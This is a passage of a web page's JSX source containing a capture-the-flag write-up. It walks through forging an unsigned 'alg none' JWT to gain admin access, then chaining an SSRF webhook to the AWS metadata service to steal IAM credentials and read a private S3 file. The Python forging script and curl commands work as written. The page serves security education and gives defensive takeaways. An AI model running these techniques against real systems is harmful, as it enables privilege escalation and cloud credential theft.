            <strong>Beginner note:</strong> many web apps remember who you are using a JSON Web Token (JWT). A JWT has three parts separated by dots: header, payload, and signature (<InlineCode>HEADER.PAYLOAD.SIGNATURE</InlineCode>). The payload stores claims such as your username and role. The signature is supposed to stop you from editing those claims. A famous flaw is when a server accepts an unsigned token whose header says the algorithm is <InlineCode>none</InlineCode>.
          </Note>

          <SectionHeading>Step 1: Create a normal account and observe the app</SectionHeading>
          <Paragraph>Before attacking anything, I registered a normal account to see what a low-privileged user can and cannot do. This is called establishing a baseline.</Paragraph>
          <CodeBlock>{`Username: arohmaurya
Password: ctf123`}</CodeBlock>
          <Paragraph>
            After logging in, the dashboard showed an access level of USER. Normal resources were available, but the Admin Vault was marked Admin only.
          </Paragraph>
          <Screenshot src={img.c5_1} alt="The normal user dashboard with USER access and the Admin Vault locked" caption="The normal user dashboard with USER access and the Admin Vault locked" />

          <SectionHeading>Step 2: Inspect the cookies with browser developer tools</SectionHeading>
          <Paragraph>
            I opened the browser developer tools (F12) and looked under Application → Storage → Cookies. Two cookies existed: <InlineCode>session</InlineCode> and <InlineCode>nx_access</InlineCode>. The <InlineCode>nx_access</InlineCode> value had the recognisable three-part shape of a JWT.
          </Paragraph>
          <CodeBlock>{`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhcm9obWF1cnlhIiwicm9sZSI6InVzZXIifQ.tXWSeHvGrTf2MZZQrFfia0BwLIujE9TX06j1pA3JF_4`}</CodeBlock>
          <Screenshot src={img.c5_2} alt="The nx_access JWT and session cookie in developer tools" caption="The nx_access JWT and session cookie in developer tools" />

          <SectionHeading>Step 3: Decode and understand the JWT</SectionHeading>
          <Paragraph>Decoding the first two parts revealed the header and payload:</Paragraph>
          <CodeBlock>{`// header
{"alg": "HS256", "typ": "JWT"}

// payload
{"sub": "arohmaurya", "role": "user"}`}</CodeBlock>
          <Paragraph>
            The key claim was <InlineCode>"role": "user"</InlineCode>. If I could change that to <InlineCode>"role": "admin"</InlineCode> and have the server accept it, I would become an administrator. Normally the signature prevents this, so the next step was to test whether the server would accept an unsigned token.
          </Paragraph>
          <Screenshot src={img.c5_3} alt="Decoded JWT header and payload showing the user role" caption="Decoded JWT header and payload showing the user role" />

          <SectionHeading>Step 4: Forge an unsigned admin token (alg none)</SectionHeading>
          <Paragraph>I built a new token where the header algorithm is <InlineCode>none</InlineCode> and the role is <InlineCode>admin</InlineCode>, with an empty signature.</Paragraph>
          <CodeBlock>{`import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "arohmaurya", "role": "admin"}

def encode(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()

token = encode(header) + "." + encode(payload) + "."
print(token)`}</CodeBlock>
          <Paragraph>Notice the token ends with a dot and has no signature. The result was:</Paragraph>
          <CodeBlock>{`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhcm9obWF1cnlhIiwicm9sZSI6ImFkbWluIn0.`}</CodeBlock>
          <Screenshot src={img.c5_4} alt="Terminal output of the forged alg none administrator JWT" caption="Terminal output of the forged alg none administrator JWT" />

          <SectionHeading>Step 5: Replace the cookie and gain admin access</SectionHeading>
          <Paragraph>
            Back in the developer tools, I replaced only the <InlineCode>nx_access</InlineCode> cookie with the forged token, keeping the <InlineCode>session</InlineCode> cookie intact, then refreshed the page. The access level changed from USER to ADMIN, and the Admin Vault changed from Admin only to Granted.
          </Paragraph>
          <Screenshot src={img.c5_5} alt="Replacing the nx_access cookie with the forged token" caption="Replacing the nx_access cookie with the forged token" />
          <Screenshot src={img.c5_6} alt="Access level now ADMIN and the Vault unlocked, revealing the flag" caption="Access level now ADMIN and the Vault unlocked, revealing the flag" />

          <FlagBox flag="FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}" />

          <Takeaway>
            A server must never trust a token whose algorithm is <InlineCode>none</InlineCode>, and it must always verify the signature with a fixed, server-chosen algorithm. Trusting a role claim from a token that the client can rewrite leads directly to privilege escalation.
          </Takeaway>


          {/* ═══════════════════════════════════════════
              CHALLENGE 6 — THE CLOUD
              ═══════════════════════════════════════════ */}
          <ChallengeHeader number={6} title="The Cloud" category="Cloud Security / SSRF / Instance Metadata / S3" points={500} />

          <SectionHeading>The idea behind the challenge</SectionHeading>
          <Paragraph>
            The final challenge was a web dashboard called NexOps, running on an AWS EC2 server at the public IP <InlineCode>43.205.120.10</InlineCode>. The flag was stored in a private S3 bucket that could only be read from inside the cloud network. Solving it required chaining several weaknesses together.
          </Paragraph>
          <Note>
            <strong>Beginner note on the key terms:</strong><br />
            <strong>SSRF</strong> (Server-Side Request Forgery) is when you trick a server into making web requests on your behalf, including to internal addresses you could never reach directly.<br />
            <strong>IMDS</strong> (Instance Metadata Service) is a special internal address (<InlineCode>169.254.169.254</InlineCode>) that every AWS server can query to get information about itself, including temporary credentials for its assigned role.<br />
            <strong>S3</strong> is Amazon's file storage service, organised into buckets.
          </Note>

          <SectionHeading>Step 1: Map the dashboard's endpoints</SectionHeading>
          <Paragraph>
            I explored the dashboard and found several endpoints, including <InlineCode>/status</InlineCode>, <InlineCode>/metrics/system</InlineCode>, <InlineCode>/metrics/config</InlineCode>, <InlineCode>/metrics/endpoints</InlineCode>, and a POST endpoint <InlineCode>/internal/webhook</InlineCode>.
          </Paragraph>
          <Paragraph>Reading the configuration endpoint leaked very useful information.</Paragraph>
          <CodeBlock>{`curl "http://43.205.120.10/metrics/config"`}</CodeBlock>
          <Paragraph>
            This revealed the AWS region <InlineCode>ap-south-1</InlineCode>, the metadata service URL, an S3 bucket named <InlineCode>fam-ctf-cloud-challenge</InlineCode> with a prefix <InlineCode>players/646</InlineCode>, and a note that bucket access was restricted to requests originating from within the VPC (the private cloud network).
          </Paragraph>
          <Screenshot src={img.c6_1} alt="The leaked configuration showing the region, bucket, and VPC restriction" caption="The leaked configuration showing the region, bucket, and VPC restriction" />

          <SectionHeading>Step 2: Identify the SSRF and reach the metadata service</SectionHeading>
          <Paragraph>
            The <InlineCode>/internal/webhook</InlineCode> endpoint accepts a URL and fetches it from the server. It only allowed addresses in the <InlineCode>169.254.x.x</InlineCode> range or the <InlineCode>amazonaws.com</InlineCode> domain, which is exactly the SSRF I needed to reach the metadata service.
          </Paragraph>
          <Paragraph>
            A direct request to <InlineCode>169.254.169.254</InlineCode> was blocked, but a hint said the instance has a name. AWS servers can reach their own metadata using the hostname <InlineCode>instance-data</InlineCode>, which bypassed the filter.
          </Paragraph>
          <Paragraph>
            The metadata service uses version 2 (IMDSv2), which first requires fetching a short-lived session token with a PUT request, then using it in a header on later requests.
          </Paragraph>
          <CodeBlock>{`# 1) Get an IMDSv2 session token (through the SSRF)
curl -sG "http://43.205.120.10/internal/webhook" \\
  --data-urlencode "url=http://instance-data/latest/api/token" \\
  --data-urlencode "method=PUT" \\
  --data-urlencode "header=X-aws-ec2-metadata-token-ttl-seconds: 21600"

# 2) List the IAM role attached to the instance
curl -sG "http://43.205.120.10/internal/webhook" \\
  --data-urlencode "url=http://instance-data/latest/meta-data/iam/security-credentials/"`}</CodeBlock>
          <Paragraph>The role name returned was <InlineCode>ctf-cloud-player-646</InlineCode>.</Paragraph>

          <SectionHeading>Step 3: Steal the temporary credentials</SectionHeading>
          <Paragraph>
            Fetching that role's credentials path returned a temporary AccessKeyId, SecretAccessKey, and session Token.
          </Paragraph>
          <CodeBlock>{`curl -sG "http://43.205.120.10/internal/webhook" \\
  --data-urlencode "url=http://instance-data/latest/meta-data/iam/security-credentials/ctf-cloud-player-646"`}</CodeBlock>
          <Paragraph>
            I loaded those three values into my environment and confirmed the identity with the AWS CLI.
          </Paragraph>
          <CodeBlock>{`aws sts get-caller-identity`}</CodeBlock>
          <Paragraph>
            This confirmed I was now acting as the instance's role (account <InlineCode>575078236408</InlineCode>, instance <InlineCode>i-0e636636fba7dfa1a</InlineCode>).
          </Paragraph>

          <SectionHeading>Step 4: Find the flag file in S3</SectionHeading>
          <Paragraph>Using the stolen credentials, I listed the bucket under my assigned prefix.</Paragraph>
          <CodeBlock>{`aws s3 ls s3://fam-ctf-cloud-challenge/players/646/ --recursive`}</CodeBlock>
          <Paragraph>This showed a single file: <InlineCode>players/646/flag.txt</InlineCode>.</Paragraph>

          <SectionHeading>Step 5: Work around the VPC restriction</SectionHeading>
          <Paragraph>
            Downloading the file directly failed with an access-denied error, because the bucket only answers requests coming from inside the cloud network (the VPC). This is where the SSRF becomes the final key again.
          </Paragraph>
          <Paragraph>
            I generated a temporary pre-signed download URL for the file, then asked the vulnerable webhook (which runs inside the VPC) to fetch that URL for me.
          </Paragraph>
          <CodeBlock>{`# Create a temporary pre-signed URL for the flag file
PRESIGNED_URL=$(aws s3 presign s3://fam-ctf-cloud-challenge/players/646/flag.txt)

# Ask the in-VPC webhook to fetch it on my behalf
curl -sG "http://43.205.120.10/internal/webhook" \\
  --data-urlencode "url=$PRESIGNED_URL"`}</CodeBlock>
          <Paragraph>
            Because the request now originated from inside the VPC, S3 served the file, and the flag was returned.
          </Paragraph>
          <Screenshot src={img.c6_2} alt="aws s3 presign step and the webhook fetching the flag" caption="aws s3 presign step and the webhook fetching the flag" />

          <FlagBox flag="FAM{cl0ud_ssrf_imds_38e13fab9225}" />

          <Takeaway>
            SSRF is dangerous in the cloud because it can reach the metadata service and steal an instance's credentials. Defences include enforcing IMDSv2, giving instance roles the minimum permissions they need, and strictly validating any URL a server is asked to fetch. A network-level restriction like a VPC boundary can still be bypassed if an attacker can make a request from inside that boundary.
          </Takeaway>


          {/* ═══════════════════════════════════════════
              CONCLUSION
              ═══════════════════════════════════════════ */}
          <div style={{
            borderTop: '1px solid var(--border-subtle)',
            paddingTop: 64,
            marginTop: 80,
            marginBottom: 40,
          }}>
            <SectionHeading>Overall Conclusion</SectionHeading>
            <Paragraph>
              The six challenges together tell a single story: secrets and trust decisions that live on the client side can always be recovered or forged by a determined attacker.
            </Paragraph>
            <ul style={{ paddingLeft: 24, marginBottom: 20, fontFamily: 'var(--font-body)', fontSize: '1.02rem', lineHeight: 2.0 }}>
              <li><strong>Challenges 1 to 3</strong> showed that anything shipped inside an Android app — whether plain strings, anonymous tokens, or App Check debug tokens — can be extracted and reused.</li>
              <li><strong>Challenge 4</strong> showed that even a custom, obfuscated signing algorithm can be reverse engineered and rebuilt exactly.</li>
              <li><strong>Challenge 5</strong> showed that trusting a role claim from a token the user can edit leads straight to admin access.</li>
              <li><strong>Challenge 6</strong> showed how a single SSRF can cascade into full cloud credential theft and data access.</li>
            </ul>
            <Paragraph>
              The consistent lesson is that security must be enforced on the server, using secrets and authorization checks that the client never sees and cannot influence. All six flags were captured, for a final total of <strong>1850 points</strong>.
            </Paragraph>
          </div>

        </article>
      </motion.main>

      <Footer />
    </>
  );
}
